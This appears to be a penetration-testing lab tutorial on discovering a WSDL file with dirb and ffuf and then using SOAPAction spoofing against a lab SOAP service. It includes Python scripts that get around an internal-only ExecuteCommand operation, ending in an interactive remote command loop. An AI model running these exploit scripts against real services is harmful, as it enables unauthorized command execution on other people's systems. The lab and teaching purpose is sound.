# Web Services Description Language (WSDL)

> Note: WSDL files can be found in many forms, such as /example.wsdl, ?wsdl, /example.disco, ?disco etc. DISCO is a Microsoft technology for publishing and discovering Web Services.


```
[!bash!]$ dirb http://<TARGET IP>:3002

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Fri Mar 25 11:53:09 2022
URL_BASE: http://<TARGET IP>:3002/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612                                                          

---- Scanning URL: http://<TARGET IP>:3002/ ----
+ http://<TARGET IP>:3002/wsdl (CODE:200|SIZE:0)                            
                                                                               
-----------------
END_TIME: Fri Mar 25 11:53:24 2022
DOWNLOADED: 4612 - FOUND: 1
```

It looks like http://<TARGET IP>:3002/wsdl exists. Let us inspect its content as follows.

```
[!bash!]$ ffuf -w "/home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt" -u 'http://<TARGET IP>:3002/wsdl?FUZZ' -fs 0 -mc 200

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://<TARGET IP>:3002/wsdl?FUZZ
 :: Wordlist         : FUZZ: /home/htb-acxxxxx/Desktop/Useful Repos/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
 :: Filter           : Response size: 0
________________________________________________

:: Progress: [40/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Error
:: Progress: [537/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro
wsdl [Status: 200, Size: 4461, Words: 967, Lines: 186]
:: Progress: [982/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Erro:: 
Progress: [1153/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err::
Progress: [1780/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2461/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Err:: 
Progress: [2588/2588] :: Job [1/1] :: 0 req/sec :: Duration: [0:00:00] :: Errors: 0 ::
```

It looks like wsdl is a valid parameter. Let us now issue a request for http://<TARGET IP>:3002/wsdl?wsdl

# SOAPAction Spoofing

SOAP messages towards a SOAP service should include both the operation and the related parameters. This operation resides in the first child element of the SOAP message's body. If HTTP is the transport of choice, it is allowed to use an additional HTTP header called SOAPAction, which contains the operation's name. The receiving web service can identify the operation within the SOAP body through this header without parsing any XML.

If a web service considers only the SOAPAction attribute when determining the operation to execute, then it may be vulnerable to SOAPAction spoofing.

```
powen@htb[/htb]$ curl http://<TARGET IP>:3002/wsdl?wsdl 

<?xml version="1.0" encoding="UTF-8"?>
<wsdl:definitions targetNamespace="http://tempuri.org/" 
  xmlns:s="http://www.w3.org/2001/XMLSchema" 
  xmlns:soap12="http://schemas.xmlsoap.org/wsdl/soap12/" 
  xmlns:http="http://schemas.xmlsoap.org/wsdl/http/" 
  xmlns:mime="http://schemas.xmlsoap.org/wsdl/mime/" 
  xmlns:tns="http://tempuri.org/" 
  xmlns:soap="http://schemas.xmlsoap.org/wsdl/soap/" 
  xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/" 
  xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" 
  xmlns:wsdl="http://schemas.xmlsoap.org/wsdl/">
  
  <wsdl:types>
    
    
    <s:schema elementFormDefault="qualified" targetNamespace="http://tempuri.org/">
      
      
      
      <s:element name="LoginRequest">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="username" type="s:string"/>
            <s:element minOccurs="1" maxOccurs="1" name="password" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      
      <s:element name="LoginResponse">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
      </s:element>
      
      
      <s:element name="ExecuteCommandRequest">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      <s:element name="ExecuteCommandResponse">
        
        <s:complexType>
          <s:sequence>
            <s:element minOccurs="1" maxOccurs="unbounded" name="result" type="s:string"/>
          </s:sequence>
        </s:complexType>
        
      </s:element>
      
      
      
    </s:schema>
    
    
  </wsdl:types>
  
  
  
  
  <!-- Login Messages -->
  <wsdl:message name="LoginSoapIn">
    
    <wsdl:part name="parameters" element="tns:LoginRequest"/>
    
  </wsdl:message>
  
  
  <wsdl:message name="LoginSoapOut">
    
    <wsdl:part name="parameters" element="tns:LoginResponse"/>
    
  </wsdl:message>
  
  
  <!-- ExecuteCommand Messages -->
  <wsdl:message name="ExecuteCommandSoapIn">
    
    <wsdl:part name="parameters" element="tns:ExecuteCommandRequest"/>
    
  </wsdl:message>
  
  
  <wsdl:message name="ExecuteCommandSoapOut">
    
    <wsdl:part name="parameters" element="tns:ExecuteCommandResponse"/>
    
  </wsdl:message>
  
  
  
  
  
  <wsdl:portType name="HacktheBoxSoapPort">
    
    
    <!-- Login Operaion | PORT -->
    <wsdl:operation name="Login">
      
      <wsdl:input message="tns:LoginSoapIn"/>
      <wsdl:output message="tns:LoginSoapOut"/>
      
    </wsdl:operation>
    
    
    <!-- ExecuteCommand Operation | PORT -->
    <wsdl:operation name="ExecuteCommand">
      
      <wsdl:input message="tns:ExecuteCommandSoapIn"/>
      <wsdl:output message="tns:ExecuteCommandSoapOut"/>
      
    </wsdl:operation>
    
  </wsdl:portType>
  
  
  
  
  
  <wsdl:binding name="HacktheboxServiceSoapBinding" type="tns:HacktheBoxSoapPort">
    
    
    <soap:binding transport="http://schemas.xmlsoap.org/soap/http"/>
    
    <!-- SOAP Login Action -->
    <wsdl:operation name="Login">
      
      <soap:operation soapAction="Login" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
      
    </wsdl:operation>
    
    
    <!-- SOAP ExecuteCommand Action -->
    <wsdl:operation name="ExecuteCommand">
      <soap:operation soapAction="ExecuteCommand" style="document"/>
      
      <wsdl:input>
        <soap:body use="literal"/>
      </wsdl:input>
      
      <wsdl:output>
        <soap:body use="literal"/>
      </wsdl:output>
    </wsdl:operation>
    
    
  </wsdl:binding>
  
  
  
  
  
  <wsdl:service name="HacktheboxService">
    
    
    <wsdl:port name="HacktheboxServiceSoapPort" binding="tns:HacktheboxServiceSoapBinding">
      <soap:address location="http://localhost:80/wsdl"/>
    </wsdl:port>
    
    
  </wsdl:service>
  
  
  
  
  
</wsdl:definitions>
```

The first thing to pay attention to is the following.

```
<wsdl:operation name="ExecuteCommand">
<soap:operation soapAction="ExecuteCommand" style="document"/>
```

We can see a SOAPAction operation called `ExecuteCommand`.

Let us take a look at the parameters.

```
<s:element name="ExecuteCommandRequest">
<s:complexType>
<s:sequence>
<s:element minOccurs="1" maxOccurs="1" name="cmd" type="s:string"/>
</s:sequence>
</s:complexType>
</s:element>
```

We notice that there is a cmd parameter. Let us build a Python script to issue requests (save it as client.py). Note that the below script will try to have the SOAP service execute a whoami command.

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><ExecuteCommandRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></ExecuteCommandRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

We get an error mentioning This function is only allowed in internal networks. We have no access to the internal networks. Does this mean we are stuck? Not yet! Let us try a SOAPAction spoofing attack, as follows.

Let us build a new Python script for our SOAPAction spoofing attack (save it as client_soapaction_spoofing.py).

```
import requests

payload = '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>whoami</cmd></LoginRequest></soap:Body></soap:Envelope>'

print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

- We specify LoginRequest in <soap:Body>, so that our request goes through. This operation is allowed from the outside.
- We specify the parameters of ExecuteCommand because we want to have the SOAP service execute a whoami command.
-We specify the blocked operation (ExecuteCommand) in the SOAPAction header

If the web service determines the operation to be executed based solely on the SOAPAction header, we may bypass the restrictions and have the SOAP service execute a whoami command.


If you want to be able to specify multiple commands and see the result each time, use the following Python script (save it as automate.py).


```
import requests

while True:
    cmd = input("$ ")
    payload = f'<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"  xmlns:tns="http://tempuri.org/" xmlns:tm="http://microsoft.com/wsdl/mime/textMatching/"><soap:Body><LoginRequest xmlns="http://tempuri.org/"><cmd>{cmd}</cmd></LoginRequest></soap:Body></soap:Envelope>'
    print(requests.post("http://<TARGET IP>:3002/wsdl", data=payload, headers={"SOAPAction":'"ExecuteCommand"'}).content)
```

